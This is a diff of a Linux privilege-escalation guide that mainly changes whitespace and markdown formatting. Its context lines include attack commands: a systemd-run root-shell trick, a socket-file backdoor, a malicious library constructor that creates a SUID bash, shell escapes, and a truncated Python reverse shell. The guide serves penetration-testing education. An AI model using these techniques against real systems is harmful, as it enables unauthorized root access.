@@ -71,7 +71,7 @@ last | tail #Login history
 
 ### Big UID
 
-Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
+Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
 **Exploit it** using: **`systemd-run -t /bin/bash`**
 
 ### Known passwords
@@ -118,7 +118,7 @@ ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 
 Then, create a **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action \(**Start**, **Stop**, **Reload**\), your **backdoor will be executed** \(unprivileged users usually cannot start/stop services but check if you can using `sudo -l`\).
 
-**Learn more about services with  `man systemd.service`.**
+**Learn more about services with `man systemd.service`.**
 
 ## **Timers**
 
@@ -147,11 +147,11 @@ Therefore, in order to abuse this permissions you would need to:
 * find some systemd unit \(like a `.service`\) that is **executing a writable binary**
 * Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** \(to impersonate that executable\)
 
-**Learn more about timers with  `man systemd.timer`.**
+**Learn more about timers with `man systemd.timer`.**
 
 ### **Enabling Timer**
 
-In order to enable a timer you need  root privileges and to execute: 
+In order to enable a timer you need root privileges and to execute:
 
 ```bash
 sudo systemctl enable backu2.timer
@@ -166,7 +166,7 @@ In brief, a Unix Socket \(technically, the correct name is Unix domain socket, *
 
 Sockets can be configured using `.socket` files.
 
-**Learn more about sockets with  `man systemd.socket`.** Inside this file some several interesting parameters can be configured:
+**Learn more about sockets with `man systemd.socket`.** Inside this file some several interesting parameters can be configured:
 
 * `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: This options are different but as summary as used to **indicate where is going to listen** the socket \(the path of the AF\_UNIX socket file, the IPv4/6 and/or port number to listen...\).
 * `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
@@ -176,7 +176,7 @@ Sockets can be configured using `.socket` files.
 
 ### Writable .socket files
 
-If you find a **writable** `.socket` file you can **add** at the begging of the `[Socket]` section something like:  `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
+If you find a **writable** `.socket` file you can **add** at the begging of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
 _Note that the system must be using that socket file configuration or the backdoor won't be executed_
 
 ### Writable sockets
@@ -197,9 +197,9 @@ If the socket **respond with a HTTP** request, then you can **communicate** with
 
 D-BUS is an **interprocess communication \(IPC\) system**, providing a simple yet powerful mechanism **allowing applications to talk to one another**, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.
 
-D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. ****\(From [here](https://www.linuxjournal.com/article/7744)\).
+D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. _\*\*_\(From [here](https://www.linuxjournal.com/article/7744)\).
 
-D-Bus use an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each  or  rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
+D-Bus use an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each or rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
 
 Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:
 
@@ -333,7 +333,7 @@ ftp>!/bin/sh
 less>! <shell_comand>
 ```
 
-{% embed url="https://gtfobins.github.io/" %}
+{% embed url="https://gtfobins.github.io/" caption="" %}
 
 ### Sudo execution bypassing paths
 
@@ -440,7 +440,7 @@ Create the file _/home/user/.config/libcalc.c_ with the code:
 static void inject() __attribute__((constructor));
 
 void inject(){
-	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
 
@@ -454,7 +454,7 @@ And execute the binary.
 
 ### /etc/ld.so.conf.d/
 
-If you can create a file in `/etc/ld.so.conf.d/` and you can execute **`ldconfig`**with root privileges \(sudo or suid\) then you can **make executable load arbitrary libraries**. 
+If you can create a file in `/etc/ld.so.conf.d/` and you can execute **`ldconfig`**with root privileges \(sudo or suid\) then you can **make executable load arbitrary libraries**.
 
 For example, to make executables in that system load libraries from _/tmp_ you can **create** in that folder a **config file** \(_test.conf_\) pointing to _/tmp_:
 
@@ -535,7 +535,7 @@ Maybe you have access to some root unprotected shell session.
 **List screen sessions**
 
 ```bash
-screen -ls 
+screen -ls
 ```
 
 ![](../../.gitbook/assets/image%20%28327%29.png)
@@ -549,7 +549,7 @@ screen -dr 3350.foo #In the example of the image
 
 ### tmux sessions
 
-**List tmux sessions** 
+**List tmux sessions**
 
 ```bash
 tmux ls
@@ -594,10 +594,10 @@ Specifies whether root can log in using ssh, default is `no`. Possible values:
 Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like `%h` , that will be replaced by the home directory. **You can indicate absolute paths** \(starting in `/`\) or **relative paths from the users home**. For example:
 
 ```bash
-AuthorizedKeysFile	.ssh/authorized_keys access
+AuthorizedKeysFile    .ssh/authorized_keys access
 ```
 
-That configuration will indicate that if you try to login with the **private** key ****of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
+That configuration will indicate that if you try to login with the **private** key **\*\*of the user "**testusername\*\*" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
 
 #### ForwardAgent/AllowAgentForwarding
 
@@ -615,7 +615,7 @@ Notice that if `Host` is `*` every time the user jumps to a different machine th
 The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.  
 The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` \(default is allow\).
 
-If you Forward Agent configured in an environment ****[**check here how to exploit it to escalate privileges**](ssh-forward-agent-exploitation.md).
+If you Forward Agent configured in an environment **\*\*\[**check here how to exploit it to escalate privileges\*\*\]\(ssh-forward-agent-exploitation.md\).
 
 ## Read sensitive data
 
@@ -708,12 +708,12 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ### Logrotate exploitation
 
-There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_  that will be executed by any user that login.  
+There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_ that will be executed by any user that login.  
 So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** \(on most linux distributions, logrotate is executed automatically once a day as **user root**\). Also, check if apart of _/var/log_ there are more files being **rotated**.
 
 More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
-You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten). 
+You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).
 
 ## Internal Open Ports
 
@@ -829,6 +829,4 @@ find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; #Check for .ssh dir
 [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)  
 [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
 [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
-
-
 
